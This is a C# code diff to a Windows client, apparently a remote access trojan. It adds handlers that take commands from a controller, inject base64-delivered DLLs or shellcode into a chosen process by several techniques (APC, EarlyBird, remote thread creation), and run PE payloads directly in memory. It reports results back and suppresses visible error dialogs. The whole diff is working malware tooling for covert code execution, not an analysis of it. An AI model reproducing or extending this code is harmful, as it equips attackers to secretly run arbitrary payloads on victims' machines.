@@ -636,7 +636,7 @@ namespace winClient48
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message);
+                //MessageBox.Show(ex.Message);
             }
             finally
             {
@@ -2428,18 +2428,83 @@ namespace winClient48
                 }
                 
                 #endregion
-                #region Injector
+                #region Injection
 
-                else if (cmd[0] == "injector")
+                else if (cmd[0] == "inject")
                 {
-                    DllLoaderMethod dlm = (DllLoaderMethod)int.Parse(cmd[1]);
-                    byte[] abBuffer = Convert.FromBase64String(cmd[2]);
+                    clsfnLoader loader = new clsfnLoader();
 
-                    (int nCode, string szMsg) x = (0, string.Empty);
+                    if (cmd[1] == "dll")
+                    {
+                        int nProcId = int.Parse(cmd[2]);
+                        int nMethod = int.Parse(cmd[3]);
+                        string szDllFileName = cmd[4];
+                        byte[] abDllBytes = Convert.FromBase64String(cmd[5]);
+                        (int nCode, string szMsg) ret = (0, string.Empty);
 
-                    
+                        switch (nMethod)
+                        {
+                            case -1:
+                                ret = loader.fnLdrLoadDll(abDllBytes);
+                                break;
+                            case 0:
+                                ret = loader.fnApcDLL(nProcId, abDllBytes);
+                                break;
+                            case 1:
+                                ret = loader.fnEarlyBirdDll(nProcId, abDllBytes);
+                                break;
+                            case 2:
+                                ret = loader.fnRemoteCreateThreadDLL(nProcId, abDllBytes);
+                                break;
+                            case 3:
+                                ret = loader.fnNtCreateThreadExDll(nProcId, abDllBytes);
+                                break;
+                            case 4:
+                                ret = loader.fnZwCreateThreadExDll(nProcId, abDllBytes);
+                                break;
+                        }
 
-                    v.SendCommand($"injector|{cmd[1]}|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}");
+                        v.fnSendCommand(new string[]
+                        {
+                            "inject",
+                            "dll",
+                            nProcId.ToString(),
+                            ret.nCode.ToString(),
+                            clsCrypto.b64E2Str(ret.szMsg),
+                        });
+                    }
+                    else if (cmd[1] == "sc") //Shellcode
+                    {
+                        int nProcId = int.Parse(cmd[2]);
+                        int nMethod = int.Parse(cmd[3]);
+                        byte[] abShellcode = Convert.FromBase64String(cmd[4]);
+                        (int nCode, string szMsg) ret = (0, string.Empty);
+
+                        switch (nMethod)
+                        {
+                            case -1:
+                                ret = loader.fnShellCodeLoader(abShellcode);
+                                break;
+                            case 0:
+                                ret = loader.fnApcSC(nProcId, abShellcode);
+                                break;
+                            case 1:
+                                ret = loader.fnEarlyBirdSC(nProcId, abShellcode);
+                                break;
+                            case 2:
+                                ret = loader.fnCreateRemoteThreadSC(nProcId, abShellcode);
+                                break;
+                        }
+
+                        v.fnSendCommand(new string[]
+                        {
+                            "inject",
+                            "sc",
+                            nProcId.ToString(),
+                            ret.nCode.ToString(),
+                            clsCrypto.b64E2Str(ret.szMsg),
+                        });
+                    }
                 }
 
                 #endregion
@@ -2570,21 +2635,25 @@ namespace winClient48
 
                 else if (cmd[0] == "fle") //Fileless Execution
                 {
+
+                    string[] alpArgs = cmd[2].Split(',').Select(x => clsCrypto.b64D2Str(x)).ToArray();
+                    byte[] abAssembly = Convert.FromBase64String(cmd[3]);
+                    clsfnLoader loader = new clsfnLoader();
+
                     if (cmd[1] == "x64")
                     {
-                        clsfnLoader loader = new clsfnLoader();
-
-                        string[] alpArgs = cmd[2].Split(',').Select(x => clsCrypto.b64D2Str(x)).ToArray();
-                        byte[] abAssembly = Convert.FromBase64String(cmd[3]);
-                        MessageBox.Show(abAssembly.Length.ToString());
                         var ret = loader.fnLoadPeIntoMemory(abAssembly);
 
                         v.fnSendCommand(new string[]
                         {
-                        "fle",
-                        ret.nCode.ToString(),
-                        ret.szMsg,
+                            "fle",
+                            ret.nCode.ToString(),
+                            ret.szMsg,
                         });
+                    }
+                    else if (cmd[1] == "cs")
+                    {
+                        
                     }
                 }
 
